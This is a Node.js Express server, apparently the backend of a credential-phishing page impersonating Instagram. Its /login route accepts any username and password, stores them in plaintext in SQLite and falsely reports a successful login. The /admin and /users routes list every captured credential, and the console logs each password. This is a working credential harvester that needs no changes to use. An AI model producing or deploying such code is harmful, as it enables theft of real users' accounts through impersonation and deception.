// install: npm install express sqlite3
const express = require("express");
const sqlite3 = require("sqlite3").verbose();
const path = require("path");

const app = express();
const PORT = 3001;

// PENTING: Middleware harus di urutan yang benar
app.use(express.json()); // untuk parsing JSON
app.use(express.urlencoded({ extended: true })); // untuk parsing form data

// Debug middleware untuk melihat semua request
app.use((req, res, next) => {
    console.log(`${req.method} ${req.url}`);
    console.log('Headers:', req.headers);
    console.log('Body:', req.body);
    next();
});

// Serve static files SETELAH middleware parsing
app.use(express.static(path.join(__dirname)));

// EJS setup
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

const db = new sqlite3.Database("users.db");

// bikin tabel user kalau belum ada
db.run(`
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    password TEXT NOT NULL
  )
`);
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});


// Admin route
app.get('/admin', (req, res) => {
    db.all('SELECT * FROM users ORDER BY id DESC', [], (err, rows) => {
        if (err) {
            res.status(500).send('Error retrieving data from database');
            return;
        }
        res.render('admin', { users: rows });
    });
});

// POST login
app.post("/login", (req, res) => {
    console.log("=== LOGIN REQUEST ===");
    console.log("Content-Type:", req.get('Content-Type'));
    console.log("Body:", req.body);
    console.log("Raw Body:", req.rawBody);

    // Cek apakah req.body ada
    if (!req.body) {
        return res.status(400).json({
            success: false,
            message: "Request body kosong"
        });
    }

    const { username, password } = req.body;

    console.log("Username:", username);
    console.log("Password:", password);

    if (!username || !password) {
        return res.status(400).json({
            success: false,
            message: "Username dan Password wajib diisi!"
        });
    }

    db.run(
        `INSERT INTO users (username, password) VALUES (?, ?)`,
        [username, password],
        function (err) {
            if (err) {
                console.error("Database error:", err.message);
                return res.status(500).json({
                    success: false,
                    message: "Gagal menyimpan data"
                });
            }

            console.log("Data berhasil disimpan dengan ID:", this.lastID);
            res.json({ success: true, message: "Login berhasil!" });
        }
    );
});

// Route untuk debugging - cek semua users
app.get("/users", (req, res) => {
    db.all("SELECT * FROM users", [], (err, rows) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        res.json(rows);
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log('Instagram server listening on 0.0.0.0:3001');
});